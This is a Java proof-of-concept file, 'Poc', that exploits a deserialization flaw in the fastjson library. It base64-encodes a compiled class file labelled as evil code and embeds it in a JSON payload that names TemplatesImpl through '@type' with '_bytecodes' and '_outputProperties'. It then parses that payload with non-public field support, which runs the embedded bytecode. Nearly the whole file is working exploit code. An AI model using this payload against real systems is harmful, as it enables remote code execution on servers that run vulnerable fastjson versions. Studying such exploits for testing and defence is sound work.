package person;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.io.IOUtils;
import org.apache.commons.codec.binary.Base64;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

/**
 * Created by web on 2017/4/29.
 */
public class Poc {

    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());

    }

    public static void  test_autoTypeDeny() throws Exception {
        ParserConfig config = new ParserConfig();
        final String fileSeparator = System.getProperty("file.separator");
        final String evilClassPath = System.getProperty("user.dir") + "\\target\\classes\\person\\Test.class";
        String evilCode = readClass(evilClassPath);
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String text1 = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," +
                "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
        System.out.println(text1);
        //String personStr = "{'name':"+text1+",'age':19}";
        //Person obj = JSON.parseObject(personStr, Person.class, config, Feature.SupportNonPublicField);
        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
        //assertEquals(Model.class, obj.getClass());

    }
    public static void main(String args[]){
        try {
            test_autoTypeDeny();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
